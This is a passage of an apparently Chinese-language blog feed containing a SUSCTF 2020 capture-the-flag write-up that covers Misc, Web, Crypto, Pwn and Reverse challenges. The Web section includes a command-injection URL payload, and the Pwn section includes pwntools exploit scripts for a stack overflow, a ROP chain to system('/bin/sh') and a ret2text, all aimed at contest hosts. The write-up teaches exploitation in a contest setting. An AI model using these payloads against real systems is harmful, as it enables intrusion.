class="number">16</span>)</span><br><span class="line">    <span class="keyword">if</span> x &gt; <span class="number">127</span> :</span><br><span class="line">        x -= <span class="number">256</span></span><br><span class="line">    <span class="keyword">if</span> y &gt; <span class="number">127</span> :</span><br><span class="line">        y -= <span class="number">256</span></span><br><span class="line">    posx += x</span><br><span class="line">    posy += y</span><br><span class="line">    btn_flag = <span class="built_in">int</span>(line[<span class="number">0</span>:<span class="number">2</span>],<span class="number">16</span>)  <span class="comment"># 1 for left , 2 for right , 0 for nothing </span></span><br><span class="line">    <span class="comment"># right button</span></span><br><span class="line">    <span class="keyword">if</span> btn_flag == <span class="number">2</span> :</span><br><span class="line">        <span class="built_in">print</span> posx , posy</span><br><span class="line">keys.close()</span><br></pre></td></tr></table></figure>
<p><code>python mouseexp.py &gt; xy.txt</code>得到坐标文本  </p>
<ol>
<li>gnuplot进入，然后<code>plot &quot;xy.txt&quot;</code>得到<br><img src="/2020/10/20/SUS2020/flag.png" alt>  </li>
<li>之前没注意到是右键，采到的左键数据镜像过来是fakeflag，淦。。  </li>
<li>搞错了，刚刚是左键数据，用右键重画一次，垂直镜像一下就能看到<br><img src="/2020/10/20/SUS2020/rotateTrueFlag.png" alt><br><code>SUS&#123;Hiahia_G0t_1t!&#125;</code></li>
</ol>
<h4 id="Misc-fix-fo"><a href="#Misc-fix-fo" class="headerlink" title="[Misc]fix_fo"></a>[Misc]fix_fo</h4><h5 id="解题思路-4"><a href="#解题思路-4" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li>将文件头60改成50即可正常解压  </li>
<li>得到文本<br><code>新佛曰：諸隸殿僧降殿吽殿諸陀摩隸僧缽薩殿願心殿薩殿咤伏殿聞莊摩咤殿諦殿如叻須降闍殿亦修我殿愍殿諸隸殿波如空殿如如囑囑殿</code>  </li>
<li>用<a href="http://hi.pcmoe.net/buddha.html">新佛曰</a>解密<br><code>SUS&#123;Ta1k_w1th_F0&#125;</code></li>
</ol>
<h4 id="Misc-你还好吗？"><a href="#Misc-你还好吗？" class="headerlink" title="[Misc]你还好吗？"></a>[Misc]你还好吗？</h4><h5 id="解题思路-5"><a href="#解题思路-5" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li>解压后发现密码被加密了，用<a href="https://www.splitbrain.org/services/ook">ook解密</a>得到<br><code>Ar3_y0u_OK??</code>  </li>
<li>用其解压Sus.7z得到png，根据提示知其高度不够导致crc校验过不了，用010editor打开，猜测差不多高就直接将高度改为0196就成功了（不行就CRC爆破）<br><img src="/2020/10/20/SUS2020/height.png" alt>  </li>
<li>打开得到flag<br><img src="/2020/10/20/SUS2020/auok.png" alt><br><code>SUS&#123;wuhu_y0u_f1nD_m3&#125;</code>  </li>
</ol>
<h4 id="Web-Sign-in"><a href="#Web-Sign-in" class="headerlink" title="[Web]Sign_in"></a>[Web]Sign_in</h4><h5 id="解题思路-6"><a href="#解题思路-6" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li>直接转到题目地址，有<br><img src="/2020/10/20/SUS2020/你知道请求头吗.png" alt>  </li>
<li>F12 - Network - CTRL R<br><img src="/2020/10/20/SUS2020/network.png" alt>  </li>
<li>点击susctf.com，Headers即可查看flag<br><img src="/2020/10/20/SUS2020/header.png" alt><br><code>SUSCTF&#123;752a426b72b98bf7eda6d5cc53174a5e&#125;</code></li>
</ol>
<h4 id="Web-Script-Kiddle"><a href="#Web-Script-Kiddle" class="headerlink" title="[Web]Script_Kiddle"></a>[Web]Script_Kiddle</h4><h5 id="解题思路-7"><a href="#解题思路-7" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li>右键查看源码发现按钮会生成1000以内随机数，且console会回显文本  </li>
<li>F12 - console  </li>
<li>一直“揍他！”就可以拿flag<br><img src="/2020/10/20/SUS2020/揍他.png" alt><br><code>SUSCTF&#123;4cded8ce3b7cdf6e8b44a030dfa15b27&#125;</code></li>
</ol>
<h4 id="Web-刀来！"><a href="#Web-刀来！" class="headerlink" title="[Web]刀来！"></a>[Web]刀来！</h4><h5 id="解题思路-8"><a href="#解题思路-8" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li>转到题目地址<br><img src="/2020/10/20/SUS2020/刀来.png" alt>  </li>
<li>可以直接执行命令所以<code>http://susctf.com:10005/?z33=system(%22ls%22);</code><br><img src="/2020/10/20/SUS2020/刀来ls.png" alt>  </li>
<li>全是文件，也cat不到flag，所以不停往上一级目录查看，直到<code>http://susctf.com:10005/?z33=system(%22ls%20../../../%22);</code><br><img src="/2020/10/20/SUS2020/三级目录.png" alt>  </li>
<li><code>http://susctf.com:10005/?z33=system(%22cat%20../../../flag%22);</code><br><img src="/2020/10/20/SUS2020/刀来cat.png" alt>  <blockquote>
<p>SUSCTF{f5f397a37b728d927576ae889b908d17}  </p>
</blockquote>
</li>
</ol>
<h4 id="Web-AT-Field"><a href="#Web-AT-Field" class="headerlink" title="[Web]AT_Field"></a>[Web]AT_Field</h4><h5 id="解题思路-9"><a href="#解题思路-9" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li>转到题目地址，输入框只允许2个字符，故F12修改长度为4  </li>
<li>输入flag，点击按钮发现不给flag，直接回车拿到了<br><code>SUSCTF&#123;b8442b229c248ab68061f4602e7e0649&#125;</code></li>
</ol>
<h4 id="Web-first-lesson"><a href="#Web-first-lesson" class="headerlink" title="[Web]first_lesson"></a>[Web]first_lesson</h4><h5 id="解题思路-10"><a href="#解题思路-10" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li><p><code>http://susctf.com:10008/?z33=feiwu&amp;rmb=shenxian</code>后回显  </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">z33 is feiwu</span><br><span class="line">rmb is shenxian</span><br><span class="line">use POST method to submit aa </span><br></pre></td></tr></table></figure>
</li>
<li><p>打开Fiddler，点击左下角开始capturing，刷新<code>http://susctf.com:10008/?z33=feiwu&amp;rmb=shenxian</code>，双击新出现的结果<br><img src="/2020/10/20/SUS2020/fiddler.png" alt>  </p>
</li>
<li><p>复制get请求内容<br><img src="/2020/10/20/SUS2020/get.png" alt>  </p>
</li>
<li>POST数据，注意添加content-type，且&amp;用url编码<br><img src="/2020/10/20/SUS2020/post.png" alt>  </li>
<li>execute并查看结果  </li>
<li>解码<br><img src="/2020/10/20/SUS2020/decode.png" alt>  </li>
<li>在textview中查看<br><img src="/2020/10/20/SUS2020/whois.png" alt></li>
</ol>
<h4 id="Crypto-嘤语"><a href="#Crypto-嘤语" class="headerlink" title="[Crypto]嘤语"></a>[Crypto]嘤语</h4><h5 id="解题思路-11"><a href="#解题思路-11" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li>注意到后面两个月亮表情对应左右花括号，猜测最后一句话是flag的密文，同时花括号前面有六个字符，应该就是SUSCTF，看1和3字符重复，验证了猜想基本正确  </li>
<li>因为开着PyCharm就正好直接拿进来CTRL R做替换了，替换思路是：先将SUSCTF对应的表情替换掉，发现前面还有个<code>F***:</code>显然是对应”FLAG”，然后有”表情+F”的组合是”OF”，再对其他字符做填充，如CLASSICAL，CIPHER等，就可以逐渐恢复出flag了  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c = <span class="string">&quot;I😊⬜CRYPTOGRAPHY,⬜A⬜CLASSICAL⬜CIPHER⬜IS⬜A⬜TYPE⬜OF⬜CIPHER⬜THAT⬜😴AS⬜USE🙃⬜HISTORICALLY⬜😅UT⬜😊O😴⬜HAS⬜FALLE😊,⬜FOR⬜THE⬜😭OST⬜PART,⬜I😊TO⬜🙃ISUSE.⬜I😊⬜CO😊TRAST⬜TO⬜😭O🙃ER😊⬜CRYPTOGRAPHIC⬜ALGORITH😭S,⬜😭OST⬜CLASSICAL⬜CIPHERS⬜CA😊⬜😅E⬜PRACTICALLY⬜CO😭PUTE🙃⬜A😊🙃⬜SOL😮E🙃⬜😅Y⬜HA😊🙃.⬜HO😴E😮ER,⬜THEY⬜ARE⬜ALSO⬜USUALLY⬜😮ERY⬜SI😭PLE⬜TO⬜😅REA😷⬜😴ITH⬜😭O🙃ER😊⬜TECH😊OLOGY.⬜THE⬜TER😭⬜I😊CLU🙃ES⬜THE⬜SI😭PLE⬜SYSTE😭S⬜USE🙃⬜SI😊CE⬜GREE😷⬜A😊🙃⬜RO😭A😊⬜TI😭ES,⬜THE⬜ELA😅ORATE⬜RE😊AISSA😊CE⬜CIPHERS,⬜😴ORL🙃⬜😴AR⬜II⬜CRYPTOGRAPHY⬜SUCH⬜AS⬜THE⬜E😊IG😭A⬜😭ACHI😊E⬜A😊🙃⬜😅EYO😊🙃.⬜HERE⬜IS⬜YOUR⬜FLAG:⬜SUSCTF&#123;EASY_REPLACE_CRYPTO&#125;.&quot;</span></span><br></pre></td></tr></table></figure>
<p><code>SUSCTF&#123;EASY_REPLACE_CRYPTO&#125;</code></p>
<h4 id="Crypto-RSSA"><a href="#Crypto-RSSA" class="headerlink" title="[Crypto]RSSA"></a>[Crypto]RSSA</h4><h5 id="解题思路-12"><a href="#解题思路-12" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li>大数分解，拿去factor和yafu都解不出来，所以<a href="http://yulige.top/?p=752#childRSA213pt_38solvers">Pollard p-1</a>  </li>
<li>因为hint值太大了，这就意味着d2会很小，那么就是<a href="https://github.com/pablocelayes/rsa-wiener-attack">wiener攻击</a>  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> generalProject.rsa_wiener_attack.RSAwienerHacker <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e1 = <span class="number">65537</span></span><br><span class="line">n1 = <span class="number">3060339854667248593045439268471563618105947041290938481437325848798323938532596377624638621097456963253037677560878331946238549090696901239603144752351327600586368201100237434726169753646811787604853964860726798254336863499145531199565109074254779876690101270258127715336168391612300304331101360275482233310674932139807609972793497538656646848415992324215456226007567101761161788925814705494294400067939912005412022042668218198383402940130898294895649777977189323224263157282092376424922614684186453440072575716268919964175691720756763119457242056477670177079759247122219232189306055203008434843682933286646266213545529</span></span><br><span class="line">c1 = <span class="number">3034469135294668773920507296346350907742457191809402478651651217514955247855057533285593352174358500799066186911877764529883001921082777805708529058571202933977282137208978346424554431043278549161483292409933547041813315975823969433401643242339079668276684778997460119485703198793575336626432882752487489338573038850368920863161207166964460908530752241974904789636070196624073568755921923220050851726340905458096183125781252224795386550130576788381853678417208871830497382705959067939298640356768911183934418681683145007224744048971106742284638285450915496700589787964160222024466744139469925581347695004377624495126915</span></span><br><span class="line">n2 = <span class="number">10807879892068351137882646909051489249635133849135554246405938629884200521475944531591568601618793402948721935425608627699981096326141738901035519331102707539920513581542001947790197240207566927971678513209908723244407016045630599048822569018427598397968961619045802981482548829222463503036924385721648266628299260991104729336073926580607199543174083380805549563817814412425939068641770601855910658492094090168370370854773061021846017875357170911444961167591295893582538961911101048500175084293595051999904087614747835111979609341806717723922618200228638905661136101116560894773115822777483505620089698306929561785323</span></span><br><span class="line">c2 = <span class="number">9683205078328252218032269702345643329971829786690479639266538047554486626818807182948959694083494415321749771694962705383395520313360833790060850924741844334210061457412714409510396570202504721712360741707661477563359914632426508418800225158732852097973890339230747236123801365622331935944566042700904386015421937836728697959613396426201564885786343062950855931133983926321168463148165960442802306229736368651402634294933332130289754301101314108768581240883792427050189942403534268596623333863094794374201347799653298070303061655891582667320043298218647231196611752237350024535657749266580570143793917557001539320495</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Pollard_p_1</span>(<span class="params">N</span>):</span></span><br><span class="line">    a = <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = a</span><br><span class="line">        <span class="comment"># precompute</span></span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">80000</span>):</span><br><span class="line">            f = <span class="built_in">pow</span>(f, n, N)</span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">80000</span>, <span class="number">104729</span> + <span class="number">1</span>):</span><br><span class="line">            f = <span class="built_in">pow</span>(f, n, N)</span><br><span class="line">            <span class="keyword">if</span> n % <span class="number">15</span> == <span class="number">0</span>:</span><br><span class="line">                d = GCD(f - <span class="number">1</span>, N)</span><br><span class="line">                <span class="keyword">if</span> <span class="number">1</span> &lt; d &lt; N:</span><br><span class="line">                    <span class="keyword">return</span> d</span><br><span class="line">        <span class="built_in">print</span>(a)</span><br><span class="line">        a += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(Pollard_p_1(n1))</span></span><br><span class="line">p1 = <span class="number">23975730849019524224501133179102224796674075610246254128092570426422042826827752011251742168145817735504529147185472555701614948560936966981378192239399032009466320988235920811175788786979445565393611983841562134713850961292348331543316941450790337102298329241467860332089091772440405878425341499542277671695443</span></span><br><span class="line">q1 = n1 // p1</span><br><span class="line">d1 = invert(e1, (p1-<span class="number">1</span>)*(q1-<span class="number">1</span>))</span><br><span class="line"><span class="comment"># print(d1)</span></span><br><span class="line"><span class="comment"># d1 = 1290874390686504113800572548905624374916776782724975256433059733649402123331783485100866839214765709327051490890533906164789637167756002530899939477455484690947244496257304479081591111430374674711210201941039895188105776196200300051585789328908847443600121450707473374776889986080083458396462547926445074654616956992228117873470173124680591450377597400447728593106359737986839543880607109412876695735287787219432558567338918079968635213970201053049858159596886411010563653463432345037560562367605341086450175287814510703091118683130796239718226908370016179998972192219601416531060637529519864036298222311171029394100081</span></span><br><span class="line"></span><br><span class="line">hint = <span class="built_in">pow</span>(c1, d1, n1)</span><br><span class="line"><span class="comment"># print(hint)</span></span><br><span class="line"><span class="comment"># hint = 6447619334753222352642437426429858393559157103132369271461053517398729066459898239876515174356275892746233257614418880902563829997140350674866683206108482180467602522894155668424194920123827480635464864103765289832500322877007095569898442461637065138702513583894277315133366039750740029708723131396176433739505095125300759881683959288494017209369857877787318788348783910350463678400192419123716822673269223216260659356722683659879902069300190507155060239407696896030102443235801007815882499003540957722284061124180164977533909072687907196264536660791464489256384351443110635373913931349991593387041785791002589247321</span></span><br><span class="line"></span><br><span class="line">d2 = hack_RSA(hint, n2)</span><br><span class="line"><span class="comment"># print(d2)</span></span><br><span class="line">d2 = <span class="number">233</span></span><br><span class="line">flag = long_to_bytes(<span class="built_in">pow</span>(c2, d2, n2))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<p><code>SUSCTF&#123;Sm0oTh_PQ_&amp;_Sma11_d&#125;</code></p>
<h4 id="Pwn-babync"><a href="#Pwn-babync" class="headerlink" title="[Pwn]babync"></a>[Pwn]babync</h4><h5 id="解题思路-13"><a href="#解题思路-13" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li>Ubuntn中<code>nc 146.56.223.95 20002</code>  </li>
<li><code>ls</code>然后<code>cat flag</code>即可</li>
</ol>
<h4 id="Pwn-babystack"><a href="#Pwn-babystack" class="headerlink" title="[Pwn]babystack"></a>[Pwn]babystack</h4><h5 id="解题思路-14"><a href="#解题思路-14" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li><p><code>checksec babystack</code>  </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little  </span><br><span class="line">    RELRO:    Full RELRO  </span><br><span class="line">    Stack:    Canary found  </span><br><span class="line">    NX:       NX enabled  </span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
</li>
<li><p>IDA64打开，<code>main()</code>有  </p>
</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 buf; <span class="comment">// [rsp+0h] [rbp-60h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+8h] [rbp-58h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+10h] [rbp-50h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+18h] [rbp-48h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+20h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">char</span> s1[<span class="number">8</span>]; <span class="comment">// [rsp+30h] [rbp-30h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+38h] [rbp-28h]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+40h] [rbp-20h]</span></span><br><span class="line">  __int64 v12; <span class="comment">// [rsp+48h] [rbp-18h]</span></span><br><span class="line">  __int64 v13; <span class="comment">// [rsp+50h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v14; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v14 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(_bss_start, <span class="number">0LL</span>);</span><br><span class="line">  buf = <span class="number">0LL</span>;</span><br><span class="line">  v5 = <span class="number">0LL</span>;</span><br><span class="line">  v6 = <span class="number">0LL</span>;</span><br><span class="line">  v7 = <span class="number">0LL</span>;</span><br><span class="line">  v8 = <span class="number">0LL</span>;</span><br><span class="line">  *(_QWORD *)s1 = <span class="number">0LL</span>;</span><br><span class="line">  v10 = <span class="number">0LL</span>;</span><br><span class="line">  v11 = <span class="number">0LL</span>;</span><br><span class="line">  v12 = <span class="number">0LL</span>;</span><br><span class="line">  v13 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Hello,I&#x27;m 1p0ch.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Leave something: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x50</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;btis_wants_girlfriends&quot;</span>) )</span><br><span class="line">    backdoor(s1, <span class="string">&quot;btis_wants_girlfriends&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol>
<li>所以，只要<code>s1=&quot;btis_wants_girlfriends&quot;</code>即可，查看栈信息<br><img src="/2020/10/20/SUS2020/babystackbuf.png" alt><br>只要填充<code>&#39;a&#39;*0x30</code>即可覆盖到s1，因此有exp如下  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;146.56.223.95&#x27;</span>, <span class="number">20006</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">48</span> + <span class="string">&quot;btis_wants_girlfriends&quot;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h4 id="Pwn-babyrop"><a href="#Pwn-babyrop" class="headerlink" title="[Pwn]babyrop"></a>[Pwn]babyrop</h4><h5 id="解题思路-15"><a href="#解题思路-15" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li><p><code>checksec babyrop</code>  </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little  </span><br><span class="line">    RELRO:    Partial RELRO  </span><br><span class="line">    Stack:    No canary found  </span><br><span class="line">    NX:       NX enabled  </span><br><span class="line">    PIE:      No PIE (0x400000) </span><br></pre></td></tr></table></figure>
</li>
<li><p>IDA64打开，直接F5，<code>main()</code>  </p>
</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-60h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x60</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Such easy rop&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Leave something: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol>
<li><p>read存在栈溢出漏洞，填入0x68个’a’就可达返回地址，但是broken_backdoor只能<code>ls</code>，并不是我们想要的，所以需要构造ROP<br><a href="https://blog.csdn.net/michaelinfinity/article/details/88584349">类似题目</a>  </p>
</li>
<li><p>可通过IDA直接SHIFT+F12找到<code>/bin/sh</code>地址为0x601050<br><img src="/2020/10/20/SUS2020/babyropbin.png" alt>  </p>
</li>
<li>函数窗口查看<code>_system()</code>地址0x400540<br><img src="/2020/10/20/SUS2020/babyropsys.png" alt>  </li>
<li>因为传入一个参数，所以需要知道rdi地址，利用<code>ROPgadget --binary babyrop --only &#39;pop|ret&#39; | grep rdi</code>可得0x400763，所以先覆盖’a’再填入rdi再放binsh再加system即可执行  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;146.56.223.95&#x27;</span>, <span class="number">20007</span>)</span><br><span class="line">rdi = <span class="number">0x400763</span></span><br><span class="line">binsh = <span class="number">0x601050</span></span><br><span class="line">sys_addr = <span class="number">0x400540</span></span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x60</span>+<span class="number">8</span>)+p64(rdi)+p64(binsh)+p64(sys_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><code>SUSCTF&#123;29b76a5fedeb34b78d4284e896ced52f&#125;</code></p>
<h4 id="Pwn-babydoor"><a href="#Pwn-babydoor" class="headerlink" title="[Pwn]babydoor"></a>[Pwn]babydoor</h4><h5 id="解题思路-16"><a href="#解题思路-16" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li><p><code>checksec babydoor</code>  </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little  </span><br><span class="line">    RELRO:    Partial RELRO  </span><br><span class="line">    Stack:    No canary found  </span><br><span class="line">    NX:       NX enabled  </span><br><span class="line">    PIE:      No PIE (0x400000)  </span><br></pre></td></tr></table></figure>
</li>
<li><p>IDA64打开，F5，找到<code>main()</code>  </p>
</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-60h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(_bss_start, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x60</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Such easy ret2text&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Leave something: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x70</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol>
<li>read存在栈溢出漏洞，传入<code>&#39;a&#39;*0x68</code>即可到达返回地址，exp如下  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;146.56.223.95&#x27;</span>, <span class="number">20008</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x68</span> + p64(<span class="number">0x400676</span>) + p64(<span class="number">0x4006fb</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h4 id="Pwn-snake"><a href="#Pwn-snake" class="headerlink" title="[Pwn]snake"></a>[Pwn]snake</h4><h5 id="解题思路-17"><a href="#解题思路-17" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li>ssh连上，<code>./snake</code>，然后就硬玩<br><img src="/2020/10/20/SUS2020/snake.png" alt></li>
</ol>
<h4 id="Reverse-迷宫"><a href="#Reverse-迷宫" class="headerlink" title="[Reverse]迷宫"></a>[Reverse]迷宫</h4><h5 id="解题思路-18"><a href="#解题思路-18" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li>在IDA中反编译后找到<br><img src="/2020/10/20/SUS2020/maze.png" alt>  </li>
<li>猜测是个迷宫矩阵，故按8x8排列得到<br><img src="/2020/10/20/SUS2020/modimaze.png" alt>  </li>
<li>所以出迷宫的方法是：LLLDDRDRRDDLLLD  </li>
<li><code>./babymaze</code>然后输入以上字符串得结果<br><code>SUSCTF&#123;DLLLDDRRDRDDLLLLLLDDRDRRDDLLLD&#125;</code>  </li>
</ol>
<h4 id="Reverse-表面"><a href="#Reverse-表面" class="headerlink" title="[Reverse]表面"></a>[Reverse]表面</h4><h5 id="解题思路-19"><a href="#解题思路-19" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li>用IDA打开，在<code>main()</code>中注意到有一个wrongans很可疑，查看一下，在其相邻的地方有<br><img src="/2020/10/20/SUS2020/rawBanner.png" alt>  </li>
<li>这就很有意思了，太像一个Banner了，其中还有0x0AH的格式，猜想是需要重新调整格式得到想要的flag，用文本编辑器调一下即可，得到<br><img src="/2020/10/20/SUS2020/babysigninBanner.png" alt>  </li>
<li>调整一下宽高明显点<br><img src="/2020/10/20/SUS2020/newBabysigninBanner.png" alt><br>所见即所得<br><code>SUS&#123;all_the_alphabets&#125;</code>  </li>
</ol>
<h4 id="Reverse-静置"><a href="#Reverse-静置" class="headerlink" title="[Reverse]静置"></a>[Reverse]静置</h4><h5 id="解题思路-20"><a href="#解题思路-20" class="headerlink" title="解题思路"></a>解题思路</h5><ol>
<li>拖到IDA反编译，SHIFT+F12查看字符串<br><img src="/2020/10/20/SUS2020/babyre.png" alt>  </li>
<li>查看mov<br><img src="/2020/10/20/SUS2020/babyremov.png" alt>  </li>
<li>16进制转ASCII即可  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">lst = [<span class="number">0x53</span>, <span class="number">0x55</span>, <span class="number">0x53</span>, <span class="number">0x43</span>, <span class="number">0x54</span>, <span class="number">0x46</span>, <span class="number">0x7B</span>, <span class="number">0x57</span>, <span class="number">0x33</span>, <span class="number">0x6C</span>, <span class="number">0x63</span>, <span class="number">0x6F</span>, <span class="number">0x6D</span>, <span class="number">0x65</span>, <span class="number">0x5F</span>, <span class="number">0x74</span>, <span class="number">0x6F</span>, <span class="number">0x5F</span>,</span><br><span class="line">       <span class="number">0x53</span>, <span class="number">0x55</span>, <span class="number">0x53</span>, <span class="number">0x43</span>, <span class="number">0x54</span>, <span class="number">0x46</span>, <span class="number">0x5F</span>, <span class="number">0x32</span>, <span class="number">0x30</span>, <span class="number">0x32</span>, <span class="number">0x30</span>, <span class="number">0x5F</span>, <span class="number">0x52</span>, <span class="number">0x45</span>, <span class="number">0x23</span>, <span class="number">0x7D</span>]</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> lst:</span><br><span class="line">    flag += <span class="built_in">chr</span>(i)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<p><code>SUSCTF&#123;W3lcome_to_SUSCTF_2020_RE#&#125;</code></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title>pikachu RECORD</title>
    <url>/2021/06/07/pikachuRecord/</url>
    <content><![CDATA[<h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><h3 id="pikachu平台搭建"><a href="#pikachu平台搭建" class="headerlink" title="pikachu平台搭建"></a>pikachu平台搭建</h3><p><a href="https://woopokyuk.github.io/2021/06/04/XAMPP%E5%AE%89%E8%A3%85%E5%90%8E%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8Apache/">https://woopokyuk.github.io/2021/06/04/XAMPP%E5%AE%89%E8%A3%85%E5%90%8E%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8Apache/</a></p>
